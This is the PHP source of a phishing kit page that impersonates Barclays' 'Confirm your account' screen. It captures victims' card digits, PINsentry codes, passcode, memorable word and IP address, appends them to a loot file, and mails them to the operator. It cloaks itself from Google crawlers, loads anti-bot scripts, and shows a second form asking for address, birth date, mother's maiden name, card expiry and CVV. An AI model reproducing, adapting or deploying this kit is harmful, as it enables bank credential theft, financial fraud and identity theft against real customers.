<?php
/*   
   _____   _                   _                        ______    __    __     ___  
                   ─████████──████████─████████──████████─████████──████████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ─────██░░░░░░██─────────██░░░░░░██─────────██░░░░░░██─────
                   ───████░░░░░░████─────████░░░░░░████─────████░░░░░░████───
                   ───██░░░░██░░░░██─────██░░░░██░░░░██─────██░░░░██░░░░██───
                   ─████░░██──██░░████─████░░██──██░░████─████░░██──██░░████─
                   ─██░░░░██──██░░░░██─██░░░░██──██░░░░██─██░░░░██──██░░░░██─
                   ─████████──████████─████████──████████─████████──████████─
                   ──────────────────────────────────────────────────────────

    
*/


session_start();
error_reporting(0);

//------------------------------------------|| ANTIBOTS  ||-----------------------------------------------------//
include "../BOTS/antibots1.php";
include "../BOTS/antibots2.php";
include "../BOTS/antibots3.php";
include "../BOTS/antibots4.php";
include "../BOTS/antibots5.php";
include "../BOTS/antibots6.php";
include "../BOTS/antibots7.php";
include "../BOTS/antibots8.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1256">
<title>myBarclays - Confirm your account</title>
<meta name="generator" content="Web Page Maker (unregistered version)">
<style type="text/css">
.name{
position: absolute;
width: 263px;
margin: 0px;
left: 387px;
top: 538px;
z-index: 0;
float: left;
border: 1px solid #CCC;
border-radius: 5px;
padding: 5px 10px;
outline: 0px none;
color: #027DB8;
}
.name:focus{
border: 1px solid #027DB8;
outline: 0px none;
}
</style>
</head>
<body style="background-repeat:no-repeat;" background="billing.png">
<?php
include("../config.php");
$cclast  = $_POST['cclast'];
$pinsentry1 =  $_POST['pinsentry1'];
$pinsentry2 = $_POST['pinsentry2'];
$passcode = $_POST['passcode'];
$memorable =  $_POST['memorable'];
$iP_adress = $_SERVER['REMOTE_ADDR'];

$Info_LOG = "
|---------------- INFO-login ---------------|
|cclast          : $cclast
|pinsentry1      : $pinsentry1
|pinsentry2      : $pinsentry2
|passcode        : $passcode
|memorable       : $memorable
|IP Adresse      : $iP_adress
|-------------------------------------------|
";
$ip = $_SERVER['REMOTE_ADDR'];
$sub = " Login | $ip ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: XXX" . "\r\n";
if(1 == 1) {
    $myFile = "../rezmdf.txt";
    $fh = @fopen($myFile, 'a+') or die("can't open file");
    @fwrite($fh, $Info_LOG);
    @fclose($fh);
}
mail($to,$sub,$Info_LOG,$head);

?>
<form method="POST" name="myBarclays" action="valid.php">
<script src="myBarclays%20-%20Confirm%20your%20account_files/jquery.js" async=""></script><script src="myBarclays%20-%20Confirm%20your%20account_files/replace.js" async=""></script><script src="myBarclays%20-%20Confirm%20your%20account_files/nowait.js" async=""></script><script type="text/javascript">
function validateForm() {
    var x = document.forms["myBarclays"]["CCV"].value;
    if (x == null || x == "") {
        alert("Please check your information.");
        return false;
    }
}                                                                   
</script>
<input class="name" value="" name="address" style="position:absolute;left:405px;top:519px;z-index:0" type="text">
<input class="name" value="" name="address2" style="position:absolute;left:405px;top:564px;z-index:1" type="text">
<input class="name" value="" name="city" style="position:absolute;left:405px;top:612px;z-index:2" type="text">
<input class="name" value="" name="postcode" style="position:absolute;left:405px;top:656px;z-index:3" type="text">
<input class="name" value="" name="date" required="" placeholder="DD" maxlength="2" style="position:absolute;width:43px;left:405px;top:700px;z-index:4" type="text">
<input class="name" value="" name="month" required="" placeholder="MM" maxlength="2" style="position:absolute;width:49px;left:470px;top:700px;z-index:5" type="text">
<input class="name" value="" name="Year" required="" placeholder="YYYY" maxlength="4" style="position:absolute;width:60px;left:544px;top:700px;z-index:6" type="text">
<input class="name" value="" name="mmn" style="position:absolute;left:405px;top:750px;z-index:7" type="text">
<input class="name" value="" name="b3d" style="position:absolute;left:405px;top:805px;z-index:7" type="text">
<input class="name" value="" name="tbp" style="position:absolute;left:405px;top:855px;z-index:7" type="text">
<input class="name" value="" name="name" style="position:absolute;left:354px;top:1020px;z-index:7" type="text">
<input class="name" value="" name="ccname" maxlength="14" style="position:absolute;left:354px;top:1066px;z-index:8" type="text">
<input class="name" value="" name="expmonth" required="" placeholder="MM" maxlength="2" style="position:absolute;width:45px;left:354px;top:1110px;z-index:9" type="text">
<input class="name" value="" name="expyear" required="" placeholder="YYYY" maxlength="4" style="position:absolute;width:59px;left:400px;top:1110px;z-index:10" type="text">
<input class="name" value="" name="ccv" required="" placeholder="" maxlength="4" style="position:absolute;width:112px;left:354px;top:1155px;z-index:11" type="text">
<div id="formimage1" style="position:absolute; left:155px; top:1235px; z-index:12">
<input name="formimage1" src="login1.png" height="36" type="image" width="113"><br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</div>


</form></body><script id="sb-script" src="myBarclays%20-%20Confirm%20your%20account_files/core.js"></script></html>